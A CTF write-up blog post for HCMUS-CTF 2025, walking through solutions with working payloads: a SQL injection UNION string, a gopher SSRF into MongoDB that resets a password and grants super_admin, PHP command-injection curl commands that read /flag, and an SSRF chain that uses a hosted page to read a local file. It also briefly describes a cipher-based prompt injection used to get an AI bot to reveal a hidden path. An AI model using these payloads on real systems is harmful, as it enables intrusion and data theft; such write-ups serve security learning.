---
title: HCMUS-CTF(Qualification+Final) 2025 Writeup
published: 2025-08-20
description: 'Writeup for HCMUS-CTF 2025'
image: './hcmus2025.png'
tags: [web, AI, ctf, writeup]
category: 'Writeup'
draft: false 
lang: ''
---

# HCMUS CTF 2025 Qualification round(36 hours)
This round I solve 3/5 web challenges and 1 AI challenges. The web challenge files is here []()

## web/Asiacs
This is a simple web challenge that require us to do SQL injection,  the vulnerable code is:
```python
def query_by_affiliation(affiliation):
    with sqlite3.connect("database.db") as conn:
        cur = conn.cursor()
        cur.execute(f"""
            SELECT p.title, a.name, pa.affiliation
            FROM paper p
            JOIN paper_author pa ON p.id = pa.paper_id
            JOIN author a ON a.id = pa.author_id
            WHERE pa.affiliation LIKE '%{affiliation}%'
        """)
        return cur.fetchall()
```

Then we can simply use this payload to get the flag: `%' UNION SELECT flag,flag,flag FROM flag -- `

## web/MAL, MALD, BALD(13 solves)
These 3 web challenges have the same source code and there are 3 different flag in the codebases. I manage to solve MAL(24 solves) - the first flag and BALD(13 solves) - the third flag using the same bug.

Here is the intended solution of the author: https://psdat123.github.io/posts/HCMUS-CTF-2025/

After analyzing the source code , the first flag is stored in the private secret of profile with username Dat2Phit

```js
await User.deleteMany({});
let data;
const username = 'Dat2Phit'
try {
    data = await jakanUsers.users(username, 'full');
} catch (error) {
    data = { data: {} };
};
const Dat2Phit = new User({
    username: username,
    role: 'admin'
});
const password = randomstring.generate({
    length: 5,
    charset: 'numeric'
});
User.register(Dat2Phit, password, async function (err, user) {
    if (err) {
        throw new Error('Failed to initialize');
    }
    data.data.secret = randomstring.generate(20);
    const userdata = await User.findOneAndUpdate(
        { username: username },
        { data: data.data },
        { new: true }
    );

    if (!myCache.has(`user_${username}`)) {
        myCache.set(`user_${username}`, userdata);
    }

    await User.findOneAndUpdate(
        { username: username },
        { 'data.secret': process.env.FLAG_1 || 'HCMUS-CTF{fake-flag}' }
    );
});
```

The second flag can be obtained by requested from the localhost:
```js
router.get('/admin/flag', async (req, res) => {
  if (req.socket.remoteAddress === '127.0.0.1') {
    res.json({ data: { flag: process.env.FLAG_2 || 'HCMUS-CTF{fakeflag}' } });
    return;
  }
  res.json({ data: { flag: {} } });
});
```

The third flag can be captured by user with super_admin role
```js
router.get('/super_admin/flag', isSuperAdmin, async (req, res) => {
  res.json({ data: { flag: process.env.FLAG_3 || 'HCMUS-CTF{fakeflag}' } });
});

function isSuperAdmin(req, res, next) {
  if (req.isAuthenticated() && req.user.role === 'super_admin') {
    return next();
  }
  return res.redirect('/login');
}
```

At first, I try to do SSRF to get the flag2, and the only sink we can do SSRF is using the `curl` command in this function:
```js
router.get('/user/:username/export', isLoggedIn, async (req, res) => {
  const username = req.params.username;
  const baseURL = `http://localhost:${process.env.PORT}`;
  const data = await execFile('curl', [`${baseURL}/user/${username}/profile`]);
  const $ = cheerio.load(data.stdout);
  const imgs = $('img:not(.user-avatar)')
  const imgs_src = []
  imgs.each(function (idx, img) {
    imgs_src.push($(img).attr('src'))
  });
  const promises = imgs_src.map((src) =>
    execFile('curl', [src], { encoding: 'buffer', maxBuffer: 5 * 1024 * 1024 })
  );
  const results = await Promise.all(promises)
  const img_buffers = await Promise.all(
    results.map(async (res) => {
      const img = await sharp(res.stdout).toFormat('png').toBuffer();
      return img
    }
  ));
  const outFile = `${exportsFilePath}/${uuidv4()}.pdf`;
  const pdfBuffers = await imgToPDF(img_buffers, imgToPDF.sizes.A5).toArray()
  fs.writeFileSync(outFile, Buffer.concat(pdfBuffers));
  res.download(outFile, `${username}.pdf`, function (err) {
    if (err) {
      console.log(err);
    }
    fs.unlinkSync(outFile);
  });
});
```

What the route basically do is `curl` to a user profile and find image's src that image's class is not `user-avatar` and then `curl` to that url. This is a blind SSRF because the output when convert to PDF and PNG has to be in the right format. So we can't get flag2 by using this endpoint. But instead what we can do is `curl` to a `gopher` url and then we can talk and send instructions to `MongoDB` database -> We can do any CRUD operation -> We can change the password of user Dat2Phit to get `flag1` and change the role of any user to super_admin to get `flag3`

Now the first step is control the url for the `curl` to request to, let analyze `views/user/userprofile.ejs,`

```html
<%- include("../partials/header") %>

<div class="container" style="margin-top: 15px;">
    <h3 style="margin-top: 30px;"><%= data.username %>'s Profile</h3>
    <% if (locals?.currentUser?.username === data.username) { %>
        <a href="./edit" class="btn btn-info" role="button">Edit profile</a>
    <% } %>
    <div class="media" style="margin-top: 20px;">
        <img class="align-self-center mr-3 user-avatar" src="<%= data?.images?.webp?.image_url %>" alt="Generic placeholder image">
        <div class="media-body">
            <% if( data?.about ){ %>
                <h5 class="mt-0">Bio</h5>
                <hr style="margin-top: 10px; margin-bottom: 10px;">
                <p><%- DOMPurify.sanitize(bbobHTML.default(data.about, presetHTML5.default()), { FORBID_TAGS: ['img'] }) %></p>
            <% } %>
            <h4 class="mt-0">Statistics</h4>
            <hr style="margin-top: 10px; margin-bottom: 10px;">
            <div style="margin-top: 20px;">
                <h5 class="mt-0">Anime Stats</h5>
                <hr style="margin-top: 5px; margin-bottom: 5px;">
                <div class="row">
                    <div class="col">
                        <div>
                            Days: <h6 style="display: inline-block;"><%= data?.statistics?.anime?.days_watched %></h6>
                            <br>
                            <br>
                            Watching <h6 style="display: inline-block;"><%= data?.statistics?.anime?.watching %></h6>
                            <br>
                            Completed <h6 style="display: inline-block;"><%= data?.statistics?.anime?.completed %></h6>
                            <br>
                            On Hold <h6 style="display: inline-block;"><%= data?.statistics?.anime?.on_hold %></h6>
                            <br>
                            Plan to Watch <h6 style="display: inline-block;"><%= data?.statistics?.anime?.plan_to_watch %></h6>
                        </div>
                    </div>
                    <div class="col">
                        <div>
                            Mean Score: <h6 style="display: inline-block;"><%= data?.statistics?.anime?.mean_score %></h6>
                            <br>
                            <br>
                            Total Entries <h6 style="display: inline-block;"><%= data?.statistics?.anime?.total_entries %></h6>
                            <br>
                            Rewatched <h6 style="display: inline-block;"><%= data?.statistics?.anime?.rewatched %></h6>
                            <br>
                            Episodes <h6 style="display: inline-block;"><%= data?.statistics?.anime?.episodes_watched %></h6>
                            <br>
                        </div>
                    </div>
                </div>
            </div>
            <div style="margin-top: 20px;">
                <h5 class="mt-0" >Manga Stats</h5>
                <hr style="margin-top: 5px; margin-bottom: 5px;">
                <div class="row">
                    <div class="col">
                        <div>
                            Days: <h6 style="display: inline-block;"><%= data?.statistics?.manga?.days_read %></h6>
                            <br>
                            Reading <h6 style="display: inline-block;"><%= data?.statistics?.manga?.reading %></h6>
                            <br>
                            Completed <h6 style="display: inline-block;"><%= data?.statistics?.manga?.completed %></h6>
                            <br>
                            On Hold <h6 style="display: inline-block;"><%= data?.statistics?.manga?.on_hold %></h6>
                            <br>
                            Plan to Read <h6 style="display: inline-block;"><%= data?.statistics?.manga?.plan_to_watch %></h6>
                        </div>
                    </div>
                    <div class="col">
                        <div>
                            Mean Score: <h6 style="display: inline-block;"><%= data?.statistics?.manga?.mean_score %></h6>
                            <br>
                            Total Entries <h6 style="display: inline-block;"><%= data?.statistics?.manga?.total_entries %></h6>
                            <br>
                            Reread <h6 style="display: inline-block;"><%= data?.statistics?.manga?.reread %></h6>
                            <br>
                            Chapters <h6 style="display: inline-block;"><%= data?.statistics?.manga?.chapters_read %></h6>
                            <br>
                            Volumes <h6 style="display: inline-block;"><%= data?.statistics?.manga?.volumes_read %></h6>
                            <br>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <h6 class="card-header text-center"><%= data.username %>'s favorite anime 
        <% if (locals?.currentUser?.username === data.username) { %>
         <a href="./export" class="btn btn-info" role="button">Export</a>
        <% } %>
    </h6>
    <div class="row m-0">
        <% data?.favorites?.anime.forEach(function(anime, index){ %>
        <div class="col-lg-4 col-md-6 border-bottom p-2">
            <div class="hover sm_anime_cover rounded float-left mr-2">
                <a href="/anime/<%= anime["mal_id"] %>">
                    <img class="rounded max-width" src="<%= anime.images.webp.large_image_url %>">
                </a>
            </div>
            <div class="h-100 pt-0 pb-1 mb-1 title border-bottom d-flex align-items-center flex-nowrap">
                <a class="anime_title text-truncate" href="/anime/<%= anime["mal_id"] %>"><%= index + 1 %>. <%= anime["title"] %></a>
            </div>
        </div>
        <% }) %>
    </div>
</div>

<%- include("../partials/footer") %>

```

Look like there are lot of controllable parameter have been sanitized using `DomPurify`, but there are unexpected parameter that we can inject html to:
```html
<div class="row m-0">
    <% data?.favorites?.anime.forEach(function(anime, index){ %>
    <div class="col-lg-4 col-md-6 border-bottom p-2">
        <div class="hover sm_anime_cover rounded float-left mr-2">
            <a href="/anime/<%= anime["mal_id"] %>">
                <img class="rounded max-width" src="<%= anime.images.webp.large_image_url %>">
            </a>
        </div>
```

We can change any property of the user passed to this template by using this endpoint:
```js
router.post('/user/:username/edit', isLoggedIn, async (req, res) => {
  const username = req.params.username;
  const existed_user2 = await jakanUsers.users(username, 'full');
  const user2 = await User.findByUsername(existed_user2.data.username);
  let user;
  if (myCache.has(`user_${username}`)) {
    user = myCache.get(`user_${username}`);
    if (user.data.username !== req.user.username) {
      throw new Error('No IDOR for u');
    }
  } else {
    const existed_user = await jakanUsers.users(username, 'full');
    user = await User.findByUsername(existed_user.data.username);
    if (!user) {
      throw new Error('No user exist');
    }
    if (user.data.username !== req.user.username) {
      throw new Error('No IDOR for u');
    }
    myCache.set(`user_${username}`, user);
  }
  const userSecret = req.body.secret;
  delete req.body.secret;
  const s = JSON.stringify(req.body).toLowerCase();
  if (s.includes('secret') || s.includes('username') || s.includes('role')) {
    throw new Error("Can't change those fields");
  }
  await User.findOneAndUpdate({ username: user.data.username, 'data.secret': userSecret }, req.body);
  res.sendStatus(204);
});
```

-> Just make POST request to the above endpoint with this payload:
```
secret=zItTSlcRHxEK2V3Zcdyp&data.favorites.anime[0][images][webp][large_image_url]=URL
```

But to get the secret above, we have to make a random user profile and go to that user profile to get the secret -> It unfortunaly get cached by this code:
```js
router.get('/user/:username/profile', async (req, res) => {
  const username = req.params.username;
  if (myCache.has(`user_${username}`)) {
    const user = myCache.get(`user_${username}`);
    res.render('user/userprofile', { data: user.data });
  } else {
    try {
      const existed_user = await jakanUsers.users(username, 'full');
      const user = await User.findByUsername(existed_user.data.username);
      if (!user) {
        throw new Error("No user exist")
      } 
      myCache.set(`user_${username}`, user);
      res.render('user/userprofile', { data: user.data });
    } catch (error) {
      throw new Error(error.message);
    } 
  }
});
```

But we can bypass the cache by go to `user/hEllo/profile`, because the username is case-insensitive -> Then the image tag will appear as we want. Then just go to `user/hEllo/export` for the `curl` to work

And the most important part: craft `gopher` payload. I install `tcpdump` in docker container then `tcpdump -i eth0 'port 27017' -w flag3.pcap`, then open that pcap in `wireshark` and get the packet. For `flag1`, I just add the code like this in `/login` route.
```js
const userdata2 = await User.findOneAndUpdate({ username: "Dat2Phit" }, { salt: '68ba7373c01e6c77a78938ade5ea9db6', hash: '51da9bed9992373ff271132a4bf1061c30c973d68ce1913f5779ebabbe68cc9f'}, { new: true });
```
For `flag3`, to get the packet I add code like this:
```js
const userdata2 = await User.findOneAndUpdate({ username: "hello" }, { role:"super_admin"}, { new: true });
```
After getting the raw hex of the packet I just use this small script to generate URL:

```python
from urllib.parse import *

def gopher():
    t = """HEX"""
    t = bytes.fromhex(t)
    x = quote(t)
    return f"gopher://mongo:27017/_{x}"

print(gopher())
```

Flag 1: HCMUS-CTF{D1d_y0u_u53_B1n4ry_s34rcH?:v}

Flag 3: HCMUS-CTF{Priv3SC_Thr0uGh_G0ph3r_n1c3!}

## AI/Campus tour
This challenge require player to trick the AI bot into show the path to the flag somehow. The way I solve it is ask ChatGPT to generate prompt injection payload, one of the payload that has succeed is related to crypto: The idea is make the bot shift each letter by a number of step of a encrypted string of /show_path_to_faculty FLAG

The payload doesn’t guarantee to be solvable every time, I only succeeded after a lot of tries.

# HCMUS CTF 2025 Final round(8 hours)
This round I managed to solve 2 web challenges and my team make it to 6th place

## web/QuickNote(21 solves)
This is a simple PHP command injection challenge, the sink is here:
```php
class Note
{
    private $ip;
    private $name;
    private $note;
    private $timestamp;

    public function __construct($ip, $name, $note)
    {
        $this->ip = $ip;
        $this->name = $name;
        $this->note = $note;
        $this->timestamp = date('Y-m-d H:i:s');
    }

    public function getNote()
    {
        return $this->note;
    }

    public function getTimestamp()
    {
        return $this->timestamp;
    }

    public function validateNote($is_premium = false)
    {
        if ($is_premium) {
            return $this->note;
        } else {
            $note_regex = '/^[\w\s.,!?-]{1,500}$/';
            return preg_match($note_regex, $this->note);
        }
    }

    public function __destruct()
    {
        $log_entry = "[{$this->timestamp}] IP: {$this->ip} | User: {$this->name} | Note: " . substr($this->note, 0, 100);
        system("echo '$log_entry' >> /quicknote/access.log");
    }
}
```

`index.php`
```php
<?php
require_once 'classes.php';

$current_user = new User('anonymous', '');

if (isset($_COOKIE['user'])) {
    try {
        $current_user = unserialize(strip_tags($_COOKIE['user']));
        if (!$current_user instanceof User) {
            throw new Exception("Invalid user object");
        }
    } catch (Exception $e) {
        $current_user = new User('anonymous', '');
    }
}

if ($_POST) {
    $action = $_POST['action'] ?? '';

    if ($action === 'login') {
        $username = $_POST['username'] ?? '';
        $premium_key = $_POST['premium_key'] ?? '';
        $user = new User($username, $premium_key);
        $serialized_user = serialize($user);
        setcookie('user', $serialized_user, time() + 3600, '/');
        header("Location: index.php");
        exit();
    }

    if ($action === 'add_note') {
        $note_content = $_POST['note'] ?? '';
        $user_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
        $note_content = str_replace("'", '"', subject: $note_content);
        $note = new Note($user_ip, $current_user->username, $note_content);

        if ($note->validateNote($current_user->isPremium())) {
            $random_hex = bin2hex(random_bytes(8));
            $filename = "notes/{$current_user->username}_{$random_hex}.txt";
            file_put_contents($filename, serialize($note));

            $note_filename = basename($filename);
            $message = "Note added successfully! <a href=\"view_note.php?file=$note_filename\" target=\"_blank\">View Note</a>";
        } else {
            $message = "Invalid note format or length!";
        }
    }
}

include 'template/main.php';
?>
```

Here is the exploit script(generated from ChatGPT)
```bash
# 1) Login with injected username; keep cookies
curl -i -c cookies.txt -d "action=login" \
  --data-urlencode "username=a';(cat /flag || cat /flag.txt || printenv PREMIUM_KEY)> notes/pwn.txt #" \
  --data-urlencode "premium_key=x" \
  http://chall.blackpinker.com:32833/index.php

# 2) Add any note (triggers __destruct and runs your injected command)
curl -b cookies.txt -d "action=add_note" --data-urlencode "note=hi" \
  http://chall.blackpinker.com:32833/index.php

# 3) Grab the output
curl http://chall.blackpinker.com:32833/notes/pwn.txt
```

## web/FaceBedge(5 solves)
In summary, the challenge is a chat app that has a feature that whenever you send message with a facebook link, it create embed facebook image/post ..., Here is the main app code:
```python
from flask import Flask, render_template, request, jsonify
import re, os
import urllib.request
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import base64
import random

FACEBED_URL = os.getenv('FACEBED_URL', 'http://localhost:9812')
app = Flask(__name__)

def get_facebook_image_data_url(url, headers=None):
  """
  Given a Facebook URL, fetch the Facebed service, extract the og:image,
  download the image, and return a data URL. Returns None on failure.
  """
  parsed = urlparse(url)
  # Build the full path including query
  full_path = parsed.path
  if parsed.query:
    full_path += '?' + parsed.query
  if not full_path.startswith('/'):
    full_path = '/' + full_path
  try:
    req = urllib.request.Request(FACEBED_URL + full_path)
    req.headers.update(headers)
    with urllib.request.urlopen(req) as response:
      html_data = response.read().decode("utf-8")
      soup = BeautifulSoup(html_data, "html.parser")
      meta = soup.find("meta", property="og:image")
      if meta and meta.get("content"):
        img_url = meta["content"]
        try:
          img_req = urllib.request.Request(img_url)
          img_req.headers.update(headers)
          with urllib.request.urlopen(img_req) as img_response:
            img_data = img_response.read()
            ext = img_url.split('.')[-1].lower()
            if ext in ['jpg', 'jpeg']:
              mime = 'image/jpeg'
            elif ext == 'png':
              mime = 'image/png'
            elif ext == 'gif':
              mime = 'image/gif'
            else:
              mime = 'application/octet-stream'
            b64 = base64.b64encode(img_data).decode('utf-8')
            return f'data:{mime};base64,{b64}'
        except Exception as e:
          return None
  except Exception as e:
    return None
  return None

def embed_url(match, headers=None):
  url = match.group(0)
  parsed = urlparse(url)
  # Facebook URL
  if parsed.netloc.endswith("facebook.com"):
    data_url = get_facebook_image_data_url(url, headers)
    if data_url:
      return f'<img src="{data_url}" alt="Facebook Embedded Image" class="embedded-image">'
    else:
      return f'<a href="{url}" target="_blank">{url}</a>'
  # Direct image URL
  if re.search(r'\.(jpg|jpeg|png|gif)$', url, re.IGNORECASE):
    return f'<img src="{url}" alt="Embedded Image" class="embedded-image">'
  # Fallback: link
  return f'<a href="{url}" target="_blank">{url}</a>'

RANDOM_RESPONSES = [
  "Nice message! 👍",
  "I see what you did there 😏",
  "That's interesting!",
  "Haha, good one! 😂",
  "Tell me more!",
  "Cool! 😎",
  "I'm just a bot, but I like your style.",
  "Did you know? Python is awesome 🐍",
  "Let's keep the chat going!",
  "Great share! 🚀",
  "What brings you here today?",
  "That made me smile!",
  "I'm always here to chat.",
  "You have a way with words!",
  "Let's vibe together!",
  "I appreciate your input.",
  "Keep those messages coming!",
  "You seem pretty cool.",
  "Is there anything else on your mind?",
  "I'm learning from you every day!",
  "That sounds awesome!",
  "You rock! 🤘",
  "Let's make this chat lively!",
  "I'm here for a good conversation.",
  "Your energy is contagious!",
  "I like your enthusiasm!",
  "Let's keep the good times rolling!",
  "You make this chat better!",
  "I'm always ready for more!",
  "That was insightful.",
  "You just made my day!"
]

@app.route('/')
def index():
  return render_template('index.html')

@app.route('/send_message', methods=['POST'])
def send_message():
  data = request.get_json()
  headers = dict(request.headers)
  headers.pop('Host', None)  # Remove Host header to avoid issues with Facebed
  headers.pop('Content-Length', None)  # Remove Content-Length header to avoid issues with Facebed
  headers.pop('Accept-Encoding', None)  # Remove Accept-Encoding header to avoid issues with Facebed
  message = data.get('message', '')
  url_regex = r'(https?://[^\s]+)'
  html = re.sub(url_regex, lambda m: embed_url(m, headers), message)
  # Pick a random response
  bot_response = random.choice(RANDOM_RESPONSES)
  return jsonify({'html': html, 'bot': bot_response})

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=1337, debug=True)

# Thank you Copilot!
```

It send the facebook url to [facebed](https://github.com/4pii4/facebed/tree/main) for it to process, but there is an unintended bug in Facebed that enable attackers to do SSRF -> We can inject html so that Facebed can process maliciously -> Then we can read local file of the server. The vulnerable code is this:
```python
def process_post(post_path: str, text_mode: bool) -> str:
    post_path = post_path.removeprefix(WWWFB).removeprefix('/')
    parsed_post = JsonParser.process_post(post_path)
    if type(parsed_post) == ParsedPost:
        if text_mode:
            return format_text_post_embed(parsed_post)
        else:
            return format_full_post_embed(parsed_post)
    else:
        return format_error_message_embed('Cannot process post', f'{WWWFB}/{post_path}')

```

Then somehow if we can reach that function and have payload like this: `https://www.facebook.com/https://www.facebook.com@linhnph05.github.io/photo`, then the url it process is `https://www.facebook.com@linhnph05.github.io/photo`, which is the attacker website, which attacker can inject html and read server local file. TLDR here is the full exploit script, I host the `index.html` file in my github pages:

`solve.py`
```python
import requests
import re
from urllib.parse import urlparse

# url = "http://localhost:1337"
url = "http://chall.blackpinker.com:32982"

# payload = "https://www.facebook.com/hcmus.compsec.club/posts/pfbid0WKghKGdFNDWRu29JBJojCSJJNZZjzawwoxmEjh5hu8kPEU3H53brSkEgSdn6KgDil"
payload = "https://www.facebook.com/https://www.facebook.com@linhnph05.github.io/photo"

redirect = requests.post(url+"/send_message", json = {"message": payload})
print(redirect.text)
```

`index.html`
```html
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <script type="application/json" data-content-len="999" data-sjs="true">
  {
    "data": {
      "message_preferred_body": true,
      "container_story": true,
      "message": { "text": "single photo" },
      "owner": { "name": "Eve" },
      "created_time": 1723200000
    },
    "comet_ufi_summary_and_actions_renderer": {
      "feedback": {
        "i18n_reaction_count": "1",
        "i18n_share_count": "0",
        "comment_rendering_instance": { "comments": { "total_count": 0 } }
      }
    },
    "prefetch_uris_v2": [
      { "uri": "file:///app/flag" }
    ],
    "title": { "text": "single photo" }
  }
  </script>
</head>
<body>ok</body>
</html>
```
